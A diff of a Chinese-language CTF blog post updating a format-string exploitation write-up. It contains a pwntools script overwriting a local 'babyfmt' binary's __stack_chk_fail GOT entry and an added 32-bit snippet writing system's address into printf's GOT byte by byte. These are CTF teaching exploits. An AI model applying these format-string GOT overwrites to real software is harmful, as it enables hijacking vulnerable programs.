@@ -100,13 +100,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    35k
+                    37k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    32 mins.
+                    34 mins.
                 </span>
                 
                 
@@ -217,6 +217,10 @@
 <p>后门函数就是hello，这里直接搞一波，即可：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfmt'</span>)</span><br><span class="line">p = process(<span class="string">'./babyfmt'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">system_addr = <span class="number">0x0400626</span></span><br><span class="line">stack_fail = elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">5</span> + <span class="string">'%'</span> + str(system_addr &amp; <span class="number">0xffff</span> - <span class="number">5</span>) + <span class="string">'c%8$hn'</span> + p64(stack_fail) + <span class="string">'a'</span>*<span class="number">100</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400675')</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+<p>关于32位程序单字节写入的思考：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">s1 = system&amp;<span class="number">0xff</span></span><br><span class="line">s2 = (<span class="number">0x100</span>|(system&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)-s1</span><br><span class="line">s3 = (<span class="number">0x200</span>|(system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)-(<span class="number">0x100</span>|(system&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">"%"</span> + str(s1) + <span class="string">"c"</span> + <span class="string">"%18$hhn"</span></span><br><span class="line">py += <span class="string">"%"</span> + str(s2) + <span class="string">"c"</span> + <span class="string">"%19$hhn"</span> </span><br><span class="line">py += <span class="string">"%"</span> + str(s3) + <span class="string">"c"</span> + <span class="string">"%20$hhn"</span> </span><br><span class="line">py = py.ljust(<span class="number">0x30</span>,<span class="string">'a'</span>)</span><br><span class="line">py += p32(printf_got)</span><br><span class="line">py += p32(printf_got+<span class="number">1</span>)</span><br><span class="line">py += p32(printf_got+<span class="number">2</span>)</span><br><span class="line">sl(py)</span><br></pre></td></tr></table></figure>
+
+<p>其实就是通过溢出取一个字节，实现越来越多的字节写入罢了，因为前面可能有些大，后面有些小，所以通过溢出可以解决这个问题～</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -264,9 +268,9 @@
                     </dl>
                 </div>
                 <ul>
-                    <li><a href="/">65 <p>Articles</p></a></li>
-                    <li><a href="/categories">7 <p>Categories</p></a></li>
-                    <li><a href="/tags">61 <p>Tags</p></a></li>
+                    <li><a href="/">92 <p>Articles</p></a></li>
+                    <li><a href="/categories">20 <p>Categories</p></a></li>
+                    <li><a href="/tags">82 <p>Tags</p></a></li>
                 </ul>
             </div>
             
@@ -294,7 +298,7 @@
 </body>
 <footer>
     <p class="copyright" id="copyright">
-        &copy; 2020
+        &copy; 2021
         <span class="gradient-text">
             V1ct0r
         </span>.
